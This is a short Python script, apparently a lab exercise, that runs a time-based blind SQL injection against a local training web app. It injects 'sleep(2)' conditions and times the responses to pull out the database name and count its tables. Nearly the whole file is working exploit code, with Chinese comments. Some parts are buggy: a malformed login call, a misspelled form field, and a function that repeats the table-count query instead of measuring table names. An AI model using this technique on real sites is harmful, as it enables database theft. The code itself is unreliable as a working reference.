import requests
import time

BASE_URL = "http://localhost:9999/sqli_15.php?title=Iron Man' and "

LOGIN_URL = "http://localhost:9999/login.php"

BASE_LOGIN_URL = "http://localhost:9999/"

body = {"login": "bee","password":"bug","security_leve":0,"form":"submit"}


headers={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
             "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
             "Accept-Encoding":"gzip, deflate, br",
             "Content-Type":"application/x-www-form-urlencoded",
             "Connection":"keep-alive"
        }

ACTION = " and sleep(2) -- &action=search"

def get_request_cookie():
    #创建session
    session = requests.Session()
    session.post(LOGIN_URL,body==map)
    request_cookies = session.cookies.get_dict()
    print(request_cookies)
    return request_cookies

def login():
    resp = requests.post(LOGIN_URL,data=body,headers=headers,cookies=get_request_cookie(),allow_redirects=False)
    cookies = resp.cookies
    return cookies

def get_data_base_name_length(cookies) -> int:
    count = 0
    for i in range(100):
        url = BASE_URL + "length(database()) = {}".format(i) + ACTION
        start_time = time.time()
        requests.get(url, headers=headers,cookies=cookies)
        if time.time() - start_time > 1:
            print("数据库长度为{}".format(i))
            count = i
    return count


def get_date_base_name(cookies,count):
    temp = ""
    for i in range(count + 1):
        for j in range(33, 127):
            url = BASE_URL + "ascii(substr(database(),{},1)) = {}".format(i, j) + ACTION
            start_time = time.time()
            requests.get(url, headers=headers, cookies=cookies)
            if time.time() - start_time > 1:
                temp += chr(j)
    print("数据库名称为：{}".format(temp))


def get_table_count(cookies) -> int:
    count = 0
    for i in range(100):
        url = BASE_URL + "(select count(table_name) from information_schema.TABLES where TABLE_SCHEMA = database())={}".format(i) + ACTION
        start_time = time.time()
        requests.get(url, headers=headers, cookies = cookies)
        if time.time() - start_time > 1:
            print("一共有{}张表".format(i))
            count = i
    return count

def get_table_name_length_each_table(cookies,count) -> int:
    for i in range(count+1):
        for j in range(100):
            url = BASE_URL + "(select count(table_name) from information_schema.TABLES where TABLE_SCHEMA = database())={}".format(i) + ACTION
            start_time = time.time()
            requests.get(url, headers=headers, cookies= cookies)
            if time.time() - start_time > 1:
                print("一共有{}张表".format(i))
                count = i

if __name__ == '__main__':
    #get_table_count()
    # 模拟login 获取响应 cookies
    cookies = login()
    # 通过cookies做后续测试
    # 获取总表个数
    count = get_table_count(cookies)
    # 获取各表名
    get_table_name_length_each_table(cookies,count)
